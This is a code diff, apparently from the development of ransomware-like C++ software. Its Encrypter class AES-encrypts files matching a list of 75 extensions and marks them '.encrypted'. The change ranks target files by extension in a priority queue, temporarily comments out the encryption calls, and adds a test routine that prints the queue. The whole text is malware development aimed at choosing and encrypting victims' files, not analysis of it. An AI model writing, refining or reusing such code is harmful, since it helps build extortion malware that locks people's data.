@@ -15,15 +15,14 @@ bool isEncryptedFile(string file) {
   return strcmp(ext + 1, "encrypted") == 0;
 }
 
-bool isValidFile(string file) {
+prio_t isValidFile(string file) {
   char* ext = strrchr(file, '.');
   if (ext == NULL) return false;
   ext++;
-  bool res = false;
-  for (int i = 0; i < 75 && !res; i++) {
-    res = strlen(ext) == strlen(extensions[i]) && strcmp(ext, extensions[i]) == 0;
-    printf("%s: [%s] == [%s] %d\n", file, ext, extensions[i], i);
-  }
+  uint res = 0;
+  for (int i = 0; i < 75 && res == 0; i++)
+    if (strlen(ext) == strlen(extensions[i]) && strcmp(ext, extensions[i]) == 0)
+      res = i + 1;
   return res;
 }
 
@@ -55,6 +54,7 @@ Encrypter* Encrypter::getInstance() {
 }
 
 Encrypter::Encrypter() {
+  pq = new PriorityQueue(75);
   key = NULL;
   cant_encrypted = 0;
   cant_decrypted = 0;
@@ -118,9 +118,13 @@ void Encrypter::AES_stream_decrypt(string filename) {
 }
 
 void Encrypter::encryptFile(string fname) {
-  if (!isValidFile(fname)) return;
-  ANSI_X9_23(fname);
-  AES_stream_encrypt(fname);
+  prio_t p = isValidFile(fname);
+  if (p == 0) return;
+  char* copy = new char[strlen(fname) + 1];
+  strcpy(copy, fname);
+  pq->push(copy, p);
+  //ANSI_X9_23(fname);
+  //AES_stream_encrypt(fname);
   cant_encrypted++;
 }
 
@@ -181,4 +185,15 @@ uint Encrypter::getCantEncrypted() {
 
 uint Encrypter::getCantDecrypted() {
   return cant_decrypted;
+}
+
+void Encrypter::test() {
+  while (!pq->empty()) {
+    info_t i = pq->top();
+    prio_t p = pq->max_priority();
+    printf("%d %s\n", p, i);
+    //ANSI_X9_23(i);
+    //AES_stream_encrypt(i);
+    pq->pop();
+  }
 }
